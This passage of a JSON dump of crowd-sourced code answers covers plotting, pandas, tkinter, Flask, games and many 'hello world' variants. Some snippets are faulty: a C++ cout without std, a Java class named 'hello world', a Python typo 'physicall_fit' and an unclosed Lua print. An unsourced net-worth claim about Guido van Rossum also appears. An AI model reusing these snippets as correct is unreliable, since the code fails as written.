    "description": "import matplotlib.pyplot as plt import numpy as np fig, axes = plt.subplots(1,3, figsize = (12,4)) x = np.arange(1,11) axes[0].plot(x, x**3, 'g',lw=2) axes[0].grid(True) axes[0].set_title('default grid') axes[1].plot(x, np.exp(x), 'r') axes[1].grid(color='b', ls = '-.', lw = 0.25) axes[1].set_title('custom grid') axes[2].plot(x,x) axes[2].set_title('no grid') fig.tight_layout() plt.show()\n",
    "reg_date": "2021-10-12T11:29:53.000Z"
  },
  {
    "id": 1345,
    "keyword": null,
    "link": null,
    "title": " gridlayout pyqt5 python using a for loop",
    "description": "grid.addWidget(widget,col,row)\ngrid = QGridLayout()\n",
    "reg_date": "2021-10-12T11:29:53.000Z"
  },
  {
    "id": 1346,
    "keyword": null,
    "link": null,
    "title": " group by count dataframe",
    "description": "df.groupby(['col1', 'col2']).size().reset_index(name='counts')\ndf.groupby(['col1','col2']).size()\ndf[['col1', 'col2', 'col3', 'col4']].groupby(['col1', 'col2']).agg(['mean', 'count']) \n",
    "reg_date": "2021-10-12T11:29:53.000Z"
  },
  {
    "id": 1347,
    "keyword": null,
    "link": null,
    "title": " grouping products for sales",
    "description": "data = Item[Item['Bill No'].duplicated(keep=False)]  # Referenced: https://stackoverflow.com/questions/27298178/concatenate-strings-from-several-rows-using-pandas-groupby data['Grouped'] = data.groupby('Bill No')['Item Name'].transform(lambda x: ','.join(x)) data2 = data[['Ending GST Bill No', 'Grouped']].drop_duplicates() data2.head(10)\n",
    "reg_date": "2021-10-12T11:29:53.000Z"
  },
  {
    "id": 1348,
    "keyword": null,
    "link": null,
    "title": " guess the number python",
    "description": "# updated version import random # for instructions so that the user understands def instructions():     print(\"Welcome to the guessing game you will have 3 tries to pick a number 1-10\")     print(\"Good luck btw it's all random\")   instructions() # guess limit so the user can't guess too much. guess_limit = 1 # The random guess number = random.randint(1, 10) # What users can type and see. user = int(input(\"What is the number?: \")) # The while loop so it can go on. while user != number:      if user > number:         print(\"Lower\")      elif user < number:         print(\"Higher\")      user = int(input(\"What is the number?: \"))     guess_limit += 1     if guess_limit == 3:         print(\"------------------------------------------------------\")         print(\"You ran out of guess ;( the answer was\", number, \"<--\")         print(\"------------------------------------------------------\")         break else:     print(\"You guessed it right! The number is\", number,           \"and it only took you \", guess_limit, \"tries\")\nimport random print('Hi! What is your name?') name= input() print('Well ' + str(name) + ', I was thinking of a random number between 1 and 15. Can you guess that number? If you are interested: ')  computerNumber= random.randint(1, 15)  for guessedNumber in range(1, 7):     print('Please guess a number.')     guess= input()     if int(guess) < computerNumber:         print('The number is too low.')     elif int(guess) > computerNumber:         print('The number is too high.')     else:         break # If the guess is correct. if int(guess) == computerNumber:     print('Great job, ' + str(name) + '! You made the right guess.')     print('You guessed my number in ' + str(guessedNumber) + ' guesses.') else:     print('Nope! The number I was thinking of was ' + str(computerNumber) + '.') \n",
    "reg_date": "2021-10-12T11:29:53.000Z"
  },
  {
    "id": 1349,
    "keyword": null,
    "link": null,
    "title": " guessing game python",
    "description": "# updated version import random # for instructions so that the user understands def instructions():     print(\"Welcome to the guessing game you will have 3 tries to pick a number 1-10\")     print(\"Good luck btw it's all random\")   instructions() # guess limit so the user can't guess too much. guess_limit = 1 # The random guess number = random.randint(1, 10) # What users can type and see. user = int(input(\"What is the number?: \")) # The while loop so it can go on. while user != number:      if user > number:         print(\"Lower\")      elif user < number:         print(\"Higher\")      user = int(input(\"What is the number?: \"))     guess_limit += 1     if guess_limit == 3:         print(\"------------------------------------------------------\")         print(\"You ran out of guess ;( the answer was\", number, \"<--\")         print(\"------------------------------------------------------\")         break else:     print(\"You guessed it right! The number is\", number,           \"and it only took you \", guess_limit, \"tries\")\n",
    "reg_date": "2021-10-12T11:29:53.000Z"
  },
  {
    "id": 1350,
    "keyword": null,
    "link": null,
    "title": " guido van rossum net worth",
    "description": "As of 2020, The exact net worth of Guido Van Rossum is not available but  it has been more than $10 million. He has earned most of his earnings as a  programmer and produces a Python program as a great success of his life. He  also earned while working with different companies which helped him to earn more income.\n",
    "reg_date": "2021-10-12T11:29:53.000Z"
  },
  {
    "id": 1351,
    "keyword": null,
    "link": null,
    "title": " gyp ERR! find Python",
    "description": "npm --add-python-to-path='true' --debug install --global windows-build-tools \nFROM node:alpine as build-stage RUN apk add --no-cache python3 py3-pip make g++ \napt-get update      apt-get install python2.7     ln -s /usr/bin/python2.7 /usr/bin/python \n",
    "reg_date": "2021-10-12T11:29:53.000Z"
  },
  {
    "id": 1352,
    "keyword": null,
    "link": null,
    "title": " hand cricket game in python",
    "description": "import random  lst1= [1,2,3,4,5,6,7,8,9,10]  chances_1= 20 no_of_chances_1= 0 your_runs= 0   print (\"-----------------------------------------------\\nYour Batting\\n\") while no_of_chances_1 < chances_1:          runs= int(input(\"Enter Runs for Your Batting Turn: \"))     comp_bowl= random.choice(lst1)      if runs==comp_bowl:         print (\"Your Guess: \",runs,\",Computer Guess: \",comp_bowl)         print (\"You are Out. Your Total Runs= \", your_runs,\"\\n\")         break     elif runs>10:         print (\"ALERT!! Support No only till 10\\n\")         continue     else:         your_runs= your_runs+runs         print (\"Your Guess: \",runs,\",Computer Guess: \",comp_bowl)         print (\"Your runs Now are: \",your_runs,\"\\n\")      no_of_chances_1= no_of_chances_1 + 1    lst2= [1,2,3,4,5,6,7,8,9,10]  chances_2= 20 no_of_chances_2= 0 comp_runs= 0 print (\"-----------------------------------------------\") print (\"Computer Batting-\\n\") while no_of_chances_2 < chances_2:      bowl= int(input(\"Enter Runs for Your Bowling Turn: \"))     comp_bat= random.choice(lst2)      if comp_bat==bowl:         print (\"Computer Guess: \",comp_bat,\"Your Guess: \",bowl)         print (\"The Computer is Out. Computer Runs= \",comp_runs,\"\\n\")         break     else:         comp_runs= comp_runs+comp_bat         print (\"Computer Guess: \",comp_bat,\"Your Guess: \",bowl)         print (\"Computer Runs: \",comp_runs,\"\\n\")          if comp_runs > your_runs:             break              no_of_chances_2= no_of_chances_2+1   print (\"\\n-----------------------------------------------\\nRESULTS: \")  if comp_runs < your_runs:     print (\"\\nYou won the Game.\\n\\nYour Total Runs= \",your_runs,\"  [Bowls taken(Out of 20): \",no_of_chances_1+1,\"]\",\"\\nComputer Total Runs= \",comp_runs,\"  [Bowls Taken(Out of 20): \",no_of_chances_2+1,\"]\\n\")  elif comp_runs == your_runs:     print (\"The Game is a Tie\")  else:     print (\"\\nComputer won the Game.\\n\\nComputer Total Runs= \",comp_runs,\"  [Bowls Taken(Out of 20): \",no_of_chances_2+1,\"]\",\"\\nYour Total Runs= \",your_runs,\"  [Bowls taken(Out of 20): \",no_of_chances_1+1,\"]\\n\")\n",
    "reg_date": "2021-10-12T11:29:53.000Z"
  },
  {
    "id": 1353,
    "keyword": null,
    "link": null,
    "title": " handling yaml with python",
    "description": "pip install PyYAML\n",
    "reg_date": "2021-10-12T11:29:54.000Z"
  },
  {
    "id": 1354,
    "keyword": null,
    "link": null,
    "title": " hangman project in python",
    "description": "import random stages = ['''   +---+   |   |           You hanged the man   |   |             ____________   O   |            |  \\/    \\/  |  /|\\  |            |  /\\    /\\  |  / \\  |            |     *      |                    |   ------   | =========          |____________| ''', '''   +---+   |   |   O   |  /|\\  |  /    |       | ========= ''', '''   +---+   |   |   O   |  /|\\  |       |       | ========= ''', '''   +---+   |   |   O   |  /|   |       |       | =========''', '''   +---+   |   |   O   |   |   |       |       | ========= ''', '''   +---+   |   |   O   |       |       |       | ========= ''', '''   +---+   |   |       |       |       |       | ========= '''] words = [\"in\",\"apple\",\"mango\",\"good\",\"india\",\"priyanka\",\"gramamr\"] computer_choice = random.choice(words)   display = [] word_length = len(computer_choice) for _ in range(word_length):     display += \"_\" print(display) The_end = False lives = 6 while not The_end:     if lives == 6:         print(stages[6])     guess = input(\"Guess a letter: \").lower()     for position in range(word_length):         letter = computer_choice[position]         if letter == guess:             display[position] = letter              print(display)     if guess not in computer_choice:         lives -= 1         if lives == 0:             print(\"you lost\")             print(stages[0])             The_end = True         elif lives == 1:             print(stages[1])         elif lives == 2:             print(stages[2])         elif lives == 3:             print(stages[3])         elif lives == 4:             print(stages[4])         elif lives == 5:             print(stages[5])     if \"_\" not in display:         The_end = True         print(\"You won\")\n #importing the time module import time  #welcoming the user name = raw_input(\"What is your name? \")  print \"Hello, \" + name, \"Time to play hangman!\"  print \" \"  #wait for 1 second time.sleep(1)  print \"Start guessing...\" time.sleep(0.5)  #here we set the secret word = \"secret\"  #creates an variable with an empty value guesses = ''  #determine the number of turns turns = 10  # Create a while loop  #check if the turns are more than zero while turns > 0:               # make a counter that starts with zero     failed = 0                   # for every character in secret_word         for char in word:            # see if the character is in the players guess         if char in guesses:                  # print then out the character             print char,              else:              # if not found, print a dash             print \"_\",                      # and increase the failed counter with one             failed += 1          # if failed is equal to zero      # print You Won     if failed == 0:                 print \" You won\"        # exit the script         break                    print      # ask the user go guess a character     guess = raw_input(\"guess a character:\")       # set the players guess to guesses     guesses += guess                          # if the guess is not found in the secret word     if guess not in word:          # turns counter decreases with 1 (now 9)         turns -= 1               # print wrong         print \"Wrong \"           # how many turns are left         print \"You have\", + turns, 'more guesses'        # if the turns are equal to zero         if turns == 0:                         # print \"You Lose\"             print \"You Lose \"   \n",
    "reg_date": "2021-10-12T11:29:54.000Z"
  },
  {
    "id": 1355,
    "keyword": null,
    "link": null,
    "title": " hardest python questions",
    "description": "Go here https://www.fullstack.cafe/blog/advanced-python-interview-questions\n",
    "reg_date": "2021-10-12T11:29:54.000Z"
  },
  {
    "id": 1356,
    "keyword": null,
    "link": null,
    "title": " head or tail python",
    "description": "import random name = str(input(\"Who will take head your name:- \")) name2 = str(input(\"Who will take tail your name:- \")) head_or_tail = random.randint(0,1) if head_or_tail == 1:     print(name,\"you won it's Head and\",name2,\"lost\") elif head_or_tail == 0:     print(name2,\"You won it's tail and\",name,\"you lost\")\n",
    "reg_date": "2021-10-12T11:29:54.000Z"
  },
  {
    "id": 1357,
    "keyword": null,
    "link": null,
    "title": " health definition",
    "description": "mentally_fit = True physically_fit = True socially_fit = True  if mentally_fit and physicall_fit and socially_fit:   print('You are healthy in all aspects of life') else:   print('You are not healthy in all aspects. Do not feel shy to get help')\n",
    "reg_date": "2021-10-12T11:29:54.000Z"
  },
  {
    "id": 1358,
    "keyword": null,
    "link": null,
    "title": " heapq python how to use comparator",
    "description": "class Solution:     def mergeKLists(self, lists: List[ListNode]) -> ListNode:                  setattr(ListNode, \"__lt__\", lambda self, other: self.val <= other.val)                      pq = []         for l in lists:             if l:                 heapq.heappush(pq,  l)                  out = ListNode(None)         head = out         while pq:             l = heapq.heappop(pq)             head.next = l             head = head.next             if l and l.next:                 heapq.heappush( pq, l.next)                      return out.next \n",
    "reg_date": "2021-10-12T11:29:54.000Z"
  },
  {
    "id": 1359,
    "keyword": null,
    "link": null,
    "title": " hello world",
    "description": "class HelloWorld {     public static void main(String[] args) {         System.out.println(\"Hello, World!\");     } }\nprint(\"Hello World\")\n// Objective-C hello world  #import <Foundation/Foundation.h>  int main(int argc, char * argv[]) {   @autoreleasepool {     NSLog (@\"Hello, World\");   } }\n// I can't believe there is no grepper answer here!  // Here is Java hello world:  public class HelloWorld {     public static void main(String[] args) {         System.out.println(\"Hello, World!\");     } }\n#include <iostream> int main(){ cout << \"Hello World!\"; return 0; }\necho(\"hello world\");\n#include <iostream> std::cout << \"Hello, World!\";\nHello World!\n<p>Hello World </p>\n//This is a simple Hello World program.  public class hello world { \tpublic static void main(Strin[] args) {      \tSystem.out.println(\"Hello World\");      } }\n",
    "reg_date": "2021-10-12T11:29:54.000Z"
  },
  {
    "id": 1360,
    "keyword": null,
    "link": null,
    "title": " hello world code in flask",
    "description": "#Save the file as app.py from flask import Flask app=Flask(__name__)  @app.route('/',methods=['GET','POST'])  def Home():   return \"Hello World\"  #Run on command Prompt following commands(Windows): #   >>cd Desktop/ #   >>cd FlaskFolder #   >>py -3 -m venv venv #   >>venv\\Scripts\\activate #   >>python app.py\n",
    "reg_date": "2021-10-12T11:29:54.000Z"
  },
  {
    "id": 1361,
    "keyword": null,
    "link": null,
    "title": " hello world flask python",
    "description": "#Save the file as app.py from flask import Flask app=Flask(__name__)  @app.route('/',methods=['GET','POST'])  def Home():   return \"Hello World\"  #Run on command Prompt following commands(Windows): #   >>cd Desktop/ #   >>cd FlaskFolder #   >>py -3 -m venv venv #   >>venv\\Scripts\\activate #   >>python app.py\nfrom flask import Flask app = Flask(__name__)  @app.route(\"/\") def index():     return 'Hello World'  if __name__ == '__main__':     app.run(debug=True)\n# Extremely simple flask application, will display 'Hello World!' on the screen when you run it # Access it by running it, then going to whatever port its running on (It'll say which port it's running on). from flask import Flask app = Flask(__name__)  @app.route('/') def hello_world():     return 'Hello, World!'  if __name__ == '__main__':     app.run()\nfrom flask import Flask  app = Flask(__name__)  @app.route(\"/\") def hello_world():     return \"<p>Hello, World!</p>\"  if __name__ == \"__main__\": \tapp.run(debug=True)\n",
    "reg_date": "2021-10-12T11:29:54.000Z"
  },
  {
    "id": 1362,
    "keyword": null,
    "link": null,
    "title": " hello world in c",
    "description": "#include <stdio.h> int main() { \tprintf(\"Hello World\");     return 0;  }\nprint(\"Hello World\")\n#include <stdio.h>  int main(void) { \tprintf(\"Hello, World!!!\");  }\n#include <stdio.h> int main(){   printf(\"hello world\");   return 0; }\n/*Printing Hello World in C Programming*/ #include <stdio.h> int main(){ //C unlike other languages must have atleast one function, the main function.  \tprintf(\"Hello World\"); //printf is defined in stdio.h, displays the output on the screen     return 0;      }\n#include <stdio.h> #include <stdint.h>  void  main(){     uint64_t dx = 0x357620655410;     while(dx) putchar(0x726F6C6564574820 >> (((dx>>=4) & 0377 ) << 3 ));     return ; } \n",
    "reg_date": "2021-10-12T11:29:54.000Z"
  },
  {
    "id": 1363,
    "keyword": null,
    "link": null,
    "title": " hello world in lua",
    "description": "print(\"Hello World\") print 'Hello World'\t\t-- one line strings don't need ()\nprint(\"Hello World\")\nprint(\"Hello!\"\nprint(\"Hi\") --prints hi\nio.write(\"Hello World\")\nprint(\"Hi\") -- You Can Also Print Variable i.e;  A = 1 print(A)\n",
    "reg_date": "2021-10-12T11:29:55.000Z"
  },
  {
    "id": 1364,
    "keyword": null,
    "link": null,
    "title": " hello world in r",
    "description": "print(\"Hello World!\")\n",
    "reg_date": "2021-10-12T11:29:55.000Z"
  },
  {
    "id": 1365,
    "keyword": null,
    "link": null,
    "title": " hello world python",
    "description": "print(\"Hello World\") //prints Hello World to the console\n# Your first program will grant you good luck in your python journey! Here it is:  print(\"Hello world!\")\nprint(\"Hello World\")\nprint(\"Hello World\") #Beginner python programmer I see\nprint(\"hello world! you came to the most sexy and best progremming in the world! rest of the langueges are pusies\\n\") \n#!/usr/bin/env python print \"Hello World\"\n",
    "reg_date": "2021-10-12T11:29:55.000Z"
  },
  {
    "id": 1366,
    "keyword": null,
    "link": null,
    "title": " hex to rgb python",
    "description": "from colormap import rgb2hex from colormap import hex2rgb  print(rgb2hex(255, 255, 255)) print(hex2rgb('#FFFFFF'))  >>> #FFFFFF >>> (255, 255, 255)\ndef hex2rgb(color):   hex = color.lstrip('#')   rgb = tuple(int(hex[i:i+2], 16) for i in (0, 2, 4))      return rgb  hex_color = \"#B4FBB8\" rgb_color = hex2rgb(hex_color)  print(rgb_color) #(180, 251, 184)\nh = input('Enter hex: ').lstrip('#') print('RGB =', tuple(int(h[i:i+2], 16) for i in (0, 2, 4)))\n# Convert RGB to HEX rgb = (255,255,255) # ---------> pure white print(\"#\u0002x\u0002x\u0002x\" % rgb) # -----> #ffffff  #\t\t\t\t\t\t\t\t\t\t\t\t\t- sabz\nimport matplotlib  print(matplotlib.colors.to_hex([ 0.47, 0.0, 1.0 ])) print(matplotlib.colors.to_hex([ 0.7, 0.321, 0.3, 0.5 ], keep_alpha=True))  print(matplotlib.colors.to_rgb(\"#aabbcc\")) print(matplotlib.colors.to_rgb(\"#ddee9f\"))\n",
    "reg_date": "2021-10-12T11:29:55.000Z"
  },
  {
    "id": 1367,
    "keyword": null,
    "link": null,
    "title": " hex to string python",
    "description": ">>> bytes.fromhex('HexValue').decode('utf-8') 'string' >>> bytes.fromhex('7368616b6564').decode('utf-8') 'shaked'\nhexadecimal_string = \"AB\" byte_array = bytearray.fromhex(hexadecimal_string) print(byte_array)\n>>> b'\\xde\\xad\\xbe\\xef'.hex() 'deadbeef' \n>>> bytes.fromhex('deadbeef') b'\\xde\\xad\\xbe\\xef' \nhex_string = \"0x616263\"[2:]\n",
    "reg_date": "2021-10-12T11:29:55.000Z"
  },
  {
    "id": 1368,
    "keyword": null,
    "link": null,
    "title": " hibernate windows with python",
    "description": "# This is for a windows operating system # We will use the os library import os  # os.system is basically running a cmd command  os.system(\"shutdown /s\") #shutdown os.system(\"shutdown /r\") #restart os.system(\"shutdown /l\") #logoff os.system(\"shutdown /h\") #hibernate  #for a full list of commands, go into Command Prompt and type \"shutdown\"\n",
    "reg_date": "2021-10-12T11:29:55.000Z"
  },
  {
    "id": 1369,
    "keyword": null,
    "link": null,
    "title": " hide cmd in python",
    "description": "import ctypes ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 6 )\n",
    "reg_date": "2021-10-12T11:29:55.000Z"
  },
  {
    "id": 1370,
    "keyword": null,
    "link": null,
    "title": " hide root window tkinter",
    "description": "root = tk.Tk() # Hide it with .withdraw root.withdraw() # To reveal it again: root.deiconify()\n",
    "reg_date": "2021-10-12T11:29:55.000Z"
  },
  {
    "id": 1371,
    "keyword": null,
    "link": null,
    "title": " hoe maak je machten in python",
    "description": "print(5**2) #Je krijgt nu 25 op je scherm.\n",
    "reg_date": "2021-10-12T11:29:55.000Z"
  },
  {
    "id": 1372,
    "keyword": null,
    "link": null,
    "title": " horizontal line matplotlib python",
    "description": "import matplotlib.pyplot as plt plt.axhline(0)\n",
    "reg_date": "2021-10-12T11:29:56.000Z"
  },
  {
    "id": 1373,
    "keyword": null,
    "link": null,
    "title": " hot reloading flask",
    "description": "$ export FLASK_APP=main.py $ export FLASK_ENV=development $ flask run \n",
    "reg_date": "2021-10-12T11:29:56.000Z"
  },
  {
    "id": 1374,
    "keyword": null,
    "link": null,
    "title": " hot to pay music in pygame",
    "description": "pygame.init()  pygame.mixer.music.load('Your_music_file_name_hear.mp3') pygame.mixer.music.play()\n",
    "reg_date": "2021-10-12T11:29:56.000Z"
  },
  {
    "id": 1375,
    "keyword": null,
    "link": null,
    "title": " hough transform opencv",
    "description": "import cv2 import numpy as np  img = cv2.imread('dave.jpg') gray = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY) edges = cv2.Canny(gray,50,150,apertureSize = 3)  lines = cv2.HoughLines(edges,1,np.pi/180,200) for rho,theta in lines[0]:     a = np.cos(theta)     b = np.sin(theta)     x0 = a*rho     y0 = b*rho     x1 = int(x0 + 1000*(-b))     y1 = int(y0 + 1000*(a))     x2 = int(x0 - 1000*(-b))     y2 = int(y0 - 1000*(a))      cv2.line(img,(x1,y1),(x2,y2),(0,0,255),2)  cv2.imwrite('houghlines3.jpg',img) \n",
    "reg_date": "2021-10-12T11:29:56.000Z"
  },
  {
    "id": 1376,
    "keyword": null,
    "link": null,
    "title": " how+to+print+hello+world in python",
    "description": "print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:29:56.000Z"
  },
  {
    "id": 1377,
    "keyword": null,
    "link": null,
    "title": " how calculate time in python",
    "description": "import time start = time.process_time() # your code here     print(time.process_time() - start)\nimport time  # starting time start = time.time()  # program body starts for i in range(10):     print(i)  # sleeping for 1 sec to get 10 sec runtime time.sleep(1)  # program body ends  # end time end = time.time()  # total time taken print(f\"Runtime of the program is {end - start}\")\n",
    "reg_date": "2021-10-12T11:29:56.000Z"
  },
  {
    "id": 1378,
    "keyword": null,
    "link": null,
    "title": " how can I add all the element of list of word in python?",
    "description": "l = ['aaa', 'bbb', 'ccc']  s = ''.join(l) print(s) # aaabbbccc  s = ','.join(l) print(s) # aaa,bbb,ccc  s = '-'.join(l) print(s) # aaa-bbb-ccc  s = '\\n'.join(l) print(s) # aaa # bbb # ccc \n",
    "reg_date": "2021-10-12T11:29:56.000Z"
  },
  {
    "id": 1379,
    "keyword": null,
    "link": null,
    "title": " how can I sort a dictionary in python according to its values?",
    "description": "s = {1: 1, 7: 2, 4: 2, 3: 1, 8: 1} k = dict(sorted(s.items(),key=lambda x:x[0],reverse = True)) print(k)\nx = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} {k: v for k, v in sorted(x.items(), key=lambda item: item[1])} {0: 0, 2: 1, 1: 2, 4: 3, 3: 4}\norders = { \t'cappuccino': 54, \t'latte': 56, \t'espresso': 72, \t'americano': 48, \t'cortado': 41 }  sort_orders = sorted(orders.items(), key=lambda x: x[1], reverse=True)  for i in sort_orders: \tprint(i[0], i[1])\n",
    "reg_date": "2021-10-12T11:29:56.000Z"
  },
  {
    "id": 1380,
    "keyword": null,
    "link": null,
    "title": " how clear everything on canvas in tkinter",
    "description": "# Clear Everything in Tkinter Canvas canvas.delete(\"all\")\n",
    "reg_date": "2021-10-12T11:29:56.000Z"
  },
  {
    "id": 1381,
    "keyword": null,
    "link": null,
    "title": " how copy and create same conda environment",
    "description": "#export your Anaconda environment using: conda env export > environment.yml #And recreate it using: conda env create -f environment.yml\nconda create --clone py35 --name py35-2\n",
    "reg_date": "2021-10-12T11:29:56.000Z"
  },
  {
    "id": 1382,
    "keyword": null,
    "link": null,
    "title": " how do i connect to the nation api on PNW",
    "description": "#NOTE: This is for python applications import requests, json  nationID = \"nationID you want data on\" apikey = \"Your PNW api key (found on the account page)\"  nationreq = requests.get(f\"https://politicsandwar.com/api/nation/id={nationID}&key={apikey}\") nationreq = nationreq.json()  print(nationreq)  cityids = nationreq[\"cityids\"] nationid = nationreq[\"nationid\"] nation_name = nationreq[\"name\"] nation_prename = nationreq[\"prename\"] uniqueid = nationreq[\"uniqueid\"]  print(f\"{cityids} {nationid} {nation_name} {nation_prename} {uniqueid}\")\n",
    "reg_date": "2021-10-12T11:29:57.000Z"
  },
  {
    "id": 1383,
    "keyword": null,
    "link": null,
    "title": " how do i print a list line by line in python",
    "description": "# python, print list one item at a time  my_list = [\"one\", \"two\", \"three\"]  for item in my_list:   print(item)    # you can use any variable pyton accepts in place of \"item\"\n",
    "reg_date": "2021-10-12T11:29:57.000Z"
  },
  {
    "id": 1384,
    "keyword": null,
    "link": null,
    "title": " how do i print the entire array pthon jupyter",
    "description": "with numpy.printoptions(threshold=numpy.inf):     print(arr)\n",
    "reg_date": "2021-10-12T11:29:57.000Z"
  },
  {
    "id": 1385,
    "keyword": null,
    "link": null,
    "title": " how do i print when my bot is ready in discord.py",
    "description": "@client.event async def on_ready():       print(\"bot is alive!\")\n",
    "reg_date": "2021-10-12T11:29:57.000Z"
  },
  {
    "id": 1386,
    "keyword": null,
    "link": null,
    "title": " how do i sort list in python",
    "description": "my_list = [9, 3, 1, 5, 88, 22, 99]  # sort in decreasing order my_list = sorted(my_list, reverse=True)  print(my_list)  # sort in increasing order my_list = sorted(my_list, reverse=False)  print(my_list)  # another way to sort using built-in methods my_list.sort(reverse=True)   print(my_list)  # sort again using slice indexes print(my_list[::-1])  # Output # [99, 88, 22, 9, 5, 3, 1] # [1, 3, 5, 9, 22, 88, 99] # [99, 88, 22, 9, 5, 3, 1] # [1, 3, 5, 9, 22, 88, 99]\nList_name.sort() This will sort the given list in ascending order.\npython list sort()\n",
    "reg_date": "2021-10-12T11:29:57.000Z"
  },
  {
    "id": 1387,
    "keyword": null,
    "link": null,
    "title": " how do you use a print statement in python",
    "description": "print(\"What you would like to print\")\nprint(*objects, sep=' ', end='\\n', file=sys.stdout, flush=False)\n",
    "reg_date": "2021-10-12T11:29:57.000Z"
  },
  {
    "id": 1388,
    "keyword": null,
    "link": null,
    "title": " how i install jupyter notebook in a new conda virtual environment",
    "description": " pip install jupyter notebook\n",
    "reg_date": "2021-10-12T11:29:57.000Z"
  },
  {
    "id": 1389,
    "keyword": null,
    "link": null,
    "title": " how long does it take to learn python",
    "description": "#depending on the time you dedicate to it, you can be fluent in Python in about #a month to 3 months\n",
    "reg_date": "2021-10-12T11:29:57.000Z"
  },
  {
    "id": 1390,
    "keyword": null,
    "link": null,
    "title": " how many nan in array python",
    "description": "np.count_nonzero(~np.isnan(data))\narray_has_nan = np.isnan(array_sum)\n",
    "reg_date": "2021-10-12T11:29:57.000Z"
  },
  {
    "id": 1391,
    "keyword": null,
    "link": null,
    "title": " how ot split a string every fourth eter",
    "description": ">>> line = '1234567890' >>> n = 2 >>> [line[i:i+n] for i in range(0, len(line), n)] ['12', '34', '56', '78', '90']\n",
    "reg_date": "2021-10-12T11:29:57.000Z"
  },
  {
    "id": 1392,
    "keyword": null,
    "link": null,
    "title": " how print hello world in python",
    "description": "print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:29:58.000Z"
  },
  {
    "id": 1393,
    "keyword": null,
    "link": null,
    "title": " how remove name of index pandas",
    "description": "df = df.rename_axis(None, axis = 1)\n",
    "reg_date": "2021-10-12T11:29:58.000Z"
  },
  {
    "id": 1394,
    "keyword": null,
    "link": null,
    "title": " how to  get the current web page link in selenium pthon",
    "description": "driver.current_url\nprint(browser.current_url)\n",
    "reg_date": "2021-10-12T11:29:58.000Z"
  },
  {
    "id": 1395,
    "keyword": null,
    "link": null,
    "title": " how to access element in tuple python",
    "description": "tuple1 = (1,2,3) element = tuple1[0] #first element, same as list\n# A tuple is a sequence of immutable Python objects. Tuples are # sequences, just like lists. The differences between tuples # and lists are, the tuples cannot be changed unlike lists and # tuples use parentheses, whereas lists use square brackets. tup1 = ('physics', 'chemistry', 1997, 2000); tup2 = \"a\", \"b\", \"c\", \"d\";  # To access values in tuple, use the square brackets for # slicing along with the index or indices to obtain value # available at that index. tup1[0] # Output: 'physics'\ntupel = ('banana',10,True) print(tupel[2])\n#A tuple is essentailly a list with limited uses. They are popular when making variables  #or containers that you don't want changed, or when making temporary variables. #A tuple is defined with parentheses.\n",
    "reg_date": "2021-10-12T11:29:58.000Z"
  },
  {
    "id": 1396,
    "keyword": null,
    "link": null,
    "title": " how to activate virtual environment in python",
    "description": "#------FOR LINUX/MAC---------# #installing venv  sudo apt-get install python3.6-venv #creating virtual env python3 -m venv env #activating virtual env source env/bin/activate   #-------FOR WINDOWS----------# #installing venv py -m pip install --user virtualenv #creating virtual env py -m venv env #activating virtual env .\\env\\Scripts\\activate \npython3 -m venv env python -m virtualenv env #py2  source env/bin/activate  #all this is on same directory \n# Create the virtual environment. python -m venv venv  # Activate the env. venv\\Scripts\\activate.bat\n# for windows 10  py -m venv myvirtualenv myvirtualenv\\Scripts\\activate #!!!! use \"\\\" not \"/\" !!!!!\npip install --user virtualenv py -m venv env .\\env\\Scripts\\activate\npython3 -m venv tutorial-env #name : tutorial-env tutorial-env\\Scripts\\activate \t#activate env deactivate #deactivate env\n",
    "reg_date": "2021-10-12T11:29:58.000Z"
  },
  {
    "id": 1397,
    "keyword": null,
    "link": null,
    "title": " how to add a background color in tkinter",
    "description": "window_name.configure(background='black')\n#Import: from tkinter import *  #Create Window: new_window = Tk() new_window.title(\"Hello World\") new_window.geometry(\"300x250\") #Adding the background color: new_window.config(bg = \"red\")  #new_window tells us that we are setting up something for the new window #.config() means that we want to configure something on the screen #bg tells that the background needs to be changed #\"red\" tells us what should the background color be ; it can also be a hex code  new_window.mainloop()\n",
    "reg_date": "2021-10-12T11:29:58.000Z"
  },
  {
    "id": 1398,
    "keyword": null,
    "link": null,
    "title": " how to add a column to a pandas df",
    "description": "#using the insert function: df.insert(location, column_name, list_of_values)  #example df.insert(0, 'new_column', ['a','b','c']) #explanation: #put \"new_column\" as first column of the dataframe #and puts 'a','b' and 'c' as values  #using array-like access: df['new_column_name'] = value  #df stands for dataframe\n",
    "reg_date": "2021-10-12T11:29:58.000Z"
  },
  {
    "id": 1399,
    "keyword": null,
    "link": null,
    "title": " how to add a image in tkinter",
    "description": "from tkinter import * root=Tk() img=PhotoImage(file='sunshine.jpg') Label(root,image=img).pack() root.mainloop()\nimport tkinter  from PIL import Image, ImageTk  load= Image.open(\"/Users/omprakash/Desktop/Gmail-new-logo.jpg\") render = ImageTk.PhotoImage(load) img = Label(root, image=render) img.place(x=100, y=100) \nfrom tkinter import *       root = Tk()       canvas = Canvas(root, width = 300, height = 300)       canvas.pack()       img = PhotoImage(file=\"ball.ppm\")       canvas.create_image(20,20, anchor=NW, image=img)       mainloop() \n",
    "reg_date": "2021-10-12T11:29:58.000Z"
  },
  {
    "id": 1400,
    "keyword": null,
    "link": null,
    "title": " how to add an active class to current element in navbar in django",
    "description": "# navbar_demo/pages/views.py...   '''We will pass a unique variable for each page whose value will be 'active' to make  a page active in navbar when it call.'''  def index(request):       context = {\"home_page\": \"active\"} # new info here       return render(request, 'pages/index.html', context)  def about(request):       context = {\"about_page\": \"active\"} # new info here       return render(request, 'pages/about.html', context)  def contact(request):       context = {\"contact_page\": \"active\"} # new info here       return render(request, 'pages/contact.html', context)  # In html file #   '''   <ul class=\"navbar-nav\">   <li class=\"nav-item {{ home_page }}\">       <a class=\"nav-link\" href=\"{% url 'index' %}\">Home</a>    </li>    <li class=\"nav-item {{ about_page }}\">       <a class=\"nav-link\" href=\"{% url 'about' %}\">About</a>     </li>    <li class=\"nav-item {{ contact_page }}\">        <a class=\"nav-link\" href=\"{% url 'contact' %}\">Contact</a>     </li>  </ul> '''\n<li {% if request.resolver_match.url_name == 'home' %}class=\"active\"{% endif %}>     <a href=\"/\">HOME</a> </li> \n",
    "reg_date": "2021-10-12T11:29:58.000Z"
  },
  {
    "id": 1401,
    "keyword": null,
    "link": null,
    "title": " how to add and subtract days datetime python",
